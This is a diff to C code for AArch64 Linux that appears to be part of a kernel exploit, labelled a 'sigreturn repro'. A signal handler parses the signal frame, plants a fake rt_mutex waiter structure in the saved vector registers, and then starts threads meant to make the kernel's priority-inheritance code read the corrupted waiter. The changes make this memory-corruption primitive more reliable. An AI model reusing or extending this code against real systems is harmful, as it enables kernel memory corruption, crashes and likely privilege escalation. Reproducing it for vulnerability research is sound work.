@@ -28,93 +28,79 @@ int memfd_leak;
 #define SIGRETURN_MODE_GHOST  1
 #define SIGRETURN_MODE_FULL   2
 
-static volatile int sigreturn_done = 0;
-static unsigned char g_fake_waiter[0x58];
+static atomic_int sigreturn_done;
+static atomic_int sigreturn_status;
+static atomic_int sigreturn_found_fpsimd;
+static atomic_int sigreturn_found_sve;
+static _Atomic(uintptr_t) sigreturn_target_addr;
+static unsigned char g_fake_waiter[FAKE_WAITER_LAYOUT_SIZE];
 static int sigreturn_mode = SIGRETURN_MODE_FULL;
 
-static int sigreturn_found_fpsimd = 0;
-static int sigreturn_found_sve = 0;
-static uintptr_t sigreturn_target_addr = 0;
+_Static_assert(ATOMIC_INT_LOCK_FREE == 2, "signal atomics must be lock-free");
+_Static_assert(ATOMIC_POINTER_LOCK_FREE == 2,
+               "signal pointer atomics must be lock-free");
 
 static void sigreturn_handler(int sig, siginfo_t *info, void *ucontext)
 {
     (void)sig; (void)info;
-    ucontext_t *uc = (ucontext_t *)ucontext;
-    struct sigcontext *sc = (struct sigcontext *)&uc->uc_mcontext;
+    ucontext_t *uc = ucontext;
+    uint8_t *cursor = uc->uc_mcontext.__reserved;
+    uint8_t *end = cursor + sizeof(uc->uc_mcontext.__reserved);
+    struct fpsimd_context *fpsimd = NULL;
+    int saw_sve = 0;
+    int status = -3;
 
-    /* __reserved starts at offset 0x120 from sigcontext start
-       (fault_address 8 + regs[31] 248 + sp 8 + pc 8 + pstate 8 + pad 8 = 288) */
-    unsigned char *base = (unsigned char *)sc + offsetof(struct sigcontext, __reserved);
+    atomic_store_explicit(&sigreturn_found_fpsimd, 0, memory_order_relaxed);
+    atomic_store_explicit(&sigreturn_found_sve, 0, memory_order_relaxed);
+    atomic_store_explicit(&sigreturn_target_addr, 0, memory_order_relaxed);
 
-    sigreturn_found_fpsimd = 0;
-    sigreturn_found_sve = 0;
-    sigreturn_target_addr = 0;
+    while (cursor + sizeof(struct _aarch64_ctx) <= end) {
+        struct _aarch64_ctx *header = (struct _aarch64_ctx *)cursor;
 
-    for (int off = 0; off < 4096; ) {
-        uint32_t magic = *(uint32_t *)(base + off);
-        uint32_t size  = *(uint32_t *)(base + off + 4);
-
-        if (magic == 0 && size == 0)
+        if (!header->magic && !header->size)
             break;
-        if (magic == 0) {
-            off += 8;
-            continue;
+        if (header->size < sizeof(*header) || (header->size & 15) ||
+            cursor + header->size > end) {
+            status = -2;
+            goto done;
         }
-
-        if (magic == FPSIMD_MAGIC) {
-            sigreturn_found_fpsimd = 1;
-            struct fpsimd_context *fpsimd = (struct fpsimd_context *)(base + off);
-            uintptr_t vregs = (uintptr_t)&fpsimd->vregs[0];
-
-            /* Peek next record for SVE */
-            int next_off = off + size;
-            if (next_off + 8 <= 4096) {
-                uint32_t next_magic = *(uint32_t *)(base + next_off);
-                if (next_magic == SVE_MAGIC)
-                    sigreturn_found_sve = 1;
+        if (header->magic == FPSIMD_MAGIC) {
+            if (header->size < sizeof(struct fpsimd_context)) {
+                status = -4;
+                goto done;
             }
-
-            int waiter_off = sigreturn_found_sve ? 0x28 : 0x18;
-            sigreturn_target_addr = vregs + waiter_off;
-
-            pr_info("sigreturn ctx fpsimd=%d sve=%d vregs=%016zx waiter_off=+%02x target=%016zx mode=%d\n",
-                    sigreturn_found_fpsimd, sigreturn_found_sve,
-                    vregs, waiter_off, sigreturn_target_addr, sigreturn_mode);
-
-            if (sigreturn_mode == SIGRETURN_MODE_SAFE) {
-                sigreturn_done = 1;
-                return;
-            }
-
-            uint8_t *dst = (uint8_t *)sigreturn_target_addr;
-
-            if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
-                /* Controlled panic test: zero out waiter->lock */
-                uint64_t controlled[10];
-                memset(controlled, 0, sizeof(controlled));
-                controlled[6] = 0;  /* waiter->lock at offset +0x38 = vregs + 0x50 */
-                memcpy(dst, controlled, sizeof(controlled));
-            }
-
-            sigreturn_done = 1;
-            return;
+            fpsimd = (struct fpsimd_context *)header;
+        } else if (header->magic == SVE_MAGIC) {
+            saw_sve = 1;
         }
-
-        if (size == 0)
-            break;
-        off += size;
+        cursor += header->size;
     }
 
-    /* Diagnostic hex-dump if not found */
-    pr_error("sigreturn handler: FPSIMD not found, hex-dump first 64 bytes of __reserved:\n");
-    for (int i = 0; i < 64; i += 16) {
-        pr_error("  %04x: %02x %02x %02x %02x %02x %02x %02x %02x  %02x %02x %02x %02x %02x %02x %02x %02x\n",
-                 i,
-                 base[i+0], base[i+1], base[i+2], base[i+3],
-                 base[i+4], base[i+5], base[i+6], base[i+7],
-                 base[i+8], base[i+9], base[i+10], base[i+11],
-                 base[i+12], base[i+13], base[i+14], base[i+15]);
+    if (!fpsimd)
+        goto done;
+
+    atomic_store_explicit(&sigreturn_found_fpsimd, 1, memory_order_relaxed);
+    atomic_store_explicit(&sigreturn_found_sve, saw_sve, memory_order_relaxed);
+
+    size_t waiter_off = saw_sve ? 0x28 : 0x18;
+    volatile uint8_t *dst = (volatile uint8_t *)fpsimd->vregs + waiter_off;
+    atomic_store_explicit(&sigreturn_target_addr, (uintptr_t)dst,
+                          memory_order_relaxed);
+
+    if (sigreturn_mode == SIGRETURN_MODE_SAFE) {
+        status = 1;
+        goto done;
     }
+
+    for (size_t index = 0; index < sizeof(g_fake_waiter); index++)
+        dst[index] = sigreturn_mode == SIGRETURN_MODE_GHOST
+                         ? 0
+                         : g_fake_waiter[index];
+    status = 1;
+
+done:
+    atomic_store_explicit(&sigreturn_status, status, memory_order_relaxed);
+    atomic_store_explicit(&sigreturn_done, 1, memory_order_release);
 }
 
 /* fallback если pselect_write_value/target не видны */
@@ -167,47 +153,52 @@ void do_sigreturn_fake_lock_route(void)
         return;
     }
 
-    sigreturn_done = 0;
-    syscall(SYS_tgkill, getpid(), tid, SIGUSR1);
+    atomic_store_explicit(&sigreturn_done, 0, memory_order_relaxed);
+    atomic_store_explicit(&sigreturn_status, 0, memory_order_relaxed);
+    if (syscall(SYS_tgkill, getpid(), tid, SIGUSR1) != 0) {
+        pr_error("sigreturn tgkill errno=%d\n", errno);
+        return;
+    }
 
-    while (!sigreturn_done)
-        sched_yield();
+    while (!atomic_load_explicit(&sigreturn_done, memory_order_acquire))
+        __asm__ volatile("yield" ::: "memory");
+
+    int handler_status =
+        atomic_load_explicit(&sigreturn_status, memory_order_relaxed);
+    if (handler_status != 1) {
+        pr_error("sigreturn handler status=%d fpsimd=%d sve=%d\n",
+                 handler_status,
+                 atomic_load_explicit(&sigreturn_found_fpsimd,
+                                      memory_order_relaxed),
+                 atomic_load_explicit(&sigreturn_found_sve,
+                                      memory_order_relaxed));
+        return;
+    }
 
     if (sigreturn_mode == SIGRETURN_MODE_FULL) {
         atomic_store(&punch_consume_go, 1);
-        int waited = 0;
-        while (waited < 500000) {
-            int c = atomic_load(&consumer_calls);
-            int s = atomic_load(&consumer_success);
-            if (c > 0 && s > 0)
-                break;
-            if (cfi_dirty_seen)
-                break;
-            usleep(1000);
-            waited += 1000;
-        }
+        while (atomic_load(&punch_consume_go) != 0 &&
+               atomic_load(&consumer_success) == 0)
+            __asm__ volatile("yield" ::: "memory");
         atomic_store(&punch_consume_go, 0);
         pr_info("sigreturn full mode done calls=%d success=%d\n",
                 atomic_load(&consumer_calls), atomic_load(&consumer_success));
     } else if (sigreturn_mode == SIGRETURN_MODE_GHOST) {
-        /* Trigger rt_mutex_adjust_prio_chain to read corrupted waiter->lock */
         atomic_store(&punch_consume_go, 1);
-        int waited = 0;
-        while (waited < 200000) {
-            if (cfi_dirty_seen) break;
-            usleep(1000);
-            waited += 1000;
-        }
+        while (atomic_load(&punch_consume_go) != 0 &&
+               atomic_load(&consumer_success) == 0)
+            __asm__ volatile("yield" ::: "memory");
         atomic_store(&punch_consume_go, 0);
         pr_info("sigreturn ghost mode done\n");
-        // Если нужна информация о fpsimd/sve/target – добавьте её сюда
         pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
-                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
-    } 
-    else { // SAFE режим
-        usleep(100000);
+                atomic_load(&sigreturn_found_fpsimd),
+                atomic_load(&sigreturn_found_sve),
+                atomic_load(&sigreturn_target_addr));
+    } else {
         pr_info("sigreturn isolated test complete fpsimd=%d sve=%d target=%016zx\n",
-                sigreturn_found_fpsimd, sigreturn_found_sve, sigreturn_target_addr);
+                atomic_load(&sigreturn_found_fpsimd),
+                atomic_load(&sigreturn_found_sve),
+                atomic_load(&sigreturn_target_addr));
     }
 }
 /* === END SIGRETURN REPRO === */
